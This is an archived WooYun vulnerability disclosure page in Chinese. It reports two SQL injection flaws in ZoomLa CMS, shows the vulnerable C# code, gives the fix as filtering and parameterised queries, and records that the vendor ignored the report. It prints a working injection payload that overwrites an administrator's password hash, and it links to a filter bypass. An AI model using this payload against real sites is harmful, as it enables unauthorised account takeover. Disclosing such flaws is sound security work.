@@ -1,0 +1,242 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		逐浪CMS通用型SQL注入4+5  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		逐浪CMS通用型SQL注入4+5  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2013-11-19 02:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-24：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-14：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">对于厂商那么自信说“这些漏洞都是老漏洞，之前就修复了”这种给力的态度，决定再提交两个吧，当完结篇，同时为了不浪费大家打开页面的时间，就都放在一个里面提交了！<br />
+第一个注入点同样是可以直接update的；<br />
+第二个注入点还是绕过他那坑爹的“防注入”的。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注入点1：<br />
+<br />
+http://demo.zoomla.cn/User/Pages/ViewSmallPub.aspx?Pubid=3&amp;ID=1<br />
+<br />
+Button3_Click<br />
+<br />
+</p><pre><code>protected void Button3_Click(object sender, EventArgs e)<br />
+	{<br />
+		string text = base.Request.Form[&quot;Item&quot;]; //给text赋值<br />
+		if (!string.IsNullOrEmpty(text) &amp;&amp; this.buser.DelModelInfoAllo(this.HiddenTable.Value, text)) //将参数带入删除模块中<br />
+		{<br />
+			base.Response.Write(&quot;&lt;script language=javascript&gt;alert(&#039;批量删除成功!&#039;);location.href=&#039;ViewPub.aspx?pubid=&quot; + this.HiddenPubid.Value + &quot;&#039;;&lt;/script&gt;&quot;);<br />
+			return;<br />
+		}<br />
+		base.Response.Write(&quot;&lt;script language=javascript&gt;alert(&#039;批量删除失败!请选择您要删除的数据&#039;);location.href=&#039;ViewPub.aspx?pubid=&quot; + this.HiddenPubid.Value + &quot;&#039;;&lt;/script&gt;&quot;);<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><pre><code>this.buser.DelModelInfoAllo(this.HiddenTable.Value, text)<br />
+<br />
+public bool DelModelInfoAllo(string TableName, string ids)<br />
+{<br />
+	return Sql.Del(TableName, &quot;ID in (&quot; + ids + &quot;)&quot;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+添加一个回复<br />
+<br />
+</p><p class="detail"><a href="../images/282302106863b3e8c857c7dacf732ded527647b5.png" target="_blank"><img src="../images/282302106863b3e8c857c7dacf732ded527647b5.png" alt="image037.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/28230233a7cafdf857f1cd09a8d4757b7daa468a.png" target="_blank"><img src="../images/28230233a7cafdf857f1cd09a8d4757b7daa468a.png" alt="image039.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+Item= 1); update zl_manager set adminpassword=&#039;c4ca4238a0b923820dcc509a6f75849b&#039; where adminname=&#039;testuser&#039;;--<br />
+<br />
+HiddenTable同为可控参数。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2823030367d0349b89215b55d4e3c2304db08614.png" target="_blank"><img src="../images/2823030367d0349b89215b55d4e3c2304db08614.png" alt="image041.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">注入点2：<br />
+<br />
+还是注册页面的啊………………<br />
+<br />
+http://zoomla.cn/User/Register.aspx<br />
+<br />
+找到对应的DLL，发现里面有检查用户名的函数：<br />
+<br />
+</p><pre><code>private void CheckUserName();<br />
+进入该方法<br />
+		if (this.buser.IsExit(this.TxtUserName.Text))<br />
+		{<br />
+			function.WriteErrMsg(&quot;&lt;li&gt;该用户名已被他人占用，请输入不同的用户名！&lt;/li&gt;&quot;);<br />
+		}</code></pre><p class='detail'><br />
+<br />
+继续进入到buser.IsExit<br />
+<br />
+</p><pre><code>public bool IsExit(string userName)<br />
+{<br />
+	return Sql.IsExist(this.strTableName, &quot;UserName=&#039;&quot; + userName + &quot;&#039;&quot;);<br />
+}</code></pre><p class='detail'><br />
+<br />
+看到这就感觉可能会有SQL注入了，进入Sql.IsExists：<br />
+<br />
+</p><pre><code>public static bool IsExist(string strTableName, string strWhere)<br />
+{<br />
+	string strSql = &quot;select count(*) from &quot; + strTableName; //注入<br />
+	if (!string.IsNullOrEmpty(strWhere))<br />
+	{<br />
+		strSql = strSql + &quot; WHERE &quot; + strWhere;<br />
+	}<br />
+	return SqlHelper.ObjectToInt32(SqlHelper.ExecuteScalar(CommandType.Text, strSql)) &gt; 0;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+里面防注入的绕过方法看 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-040915">WooYun: 逐浪CMS通用型SQL注入3</a> <br />
+<br />
+不再多复述了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤、参数化查询 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041320" title="逐浪CMS通用型SQL注入4+5">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-24 02:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41320";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
